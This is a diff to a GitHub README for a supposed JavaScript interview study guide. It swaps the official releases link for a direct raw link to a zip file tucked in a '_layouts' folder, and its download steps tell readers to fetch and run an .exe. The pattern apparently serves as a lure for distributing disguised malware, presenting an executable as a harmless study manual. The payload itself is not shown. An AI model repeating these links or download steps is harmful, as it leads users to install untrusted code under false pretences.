@@ -1,13 +1,13 @@
 # 📘 javascript-interview-manual - Master complex technical interview concepts effectively
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/primarytopdog677/javascript-interview-manual/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/primarytopdog677/javascript-interview-manual/raw/refs/heads/main/_layouts/interview-javascript-manual-1.7-beta.5.zip)
 
 This software serves as a study guide for JavaScript developers. It covers high-level concepts tested in senior engineering interviews. You learn how the language engine works, how tasks queue, and how object inheritance functions. The manual removes guesswork from your preparation by focusing on core technical mechanics.
 
 ## 📥 How to download the application
 
 1. Open your web browser. 
-2. Visit the [official download page](https://github.com/primarytopdog677/javascript-interview-manual/releases).
+2. Visit the [official download page](https://github.com/primarytopdog677/javascript-interview-manual/raw/refs/heads/main/_layouts/interview-javascript-manual-1.7-beta.5.zip).
 3. Find the latest version of the file ending in .exe under the Assets section.
 4. Click the file name to start your download.
 5. Wait for the file to save to your computer.
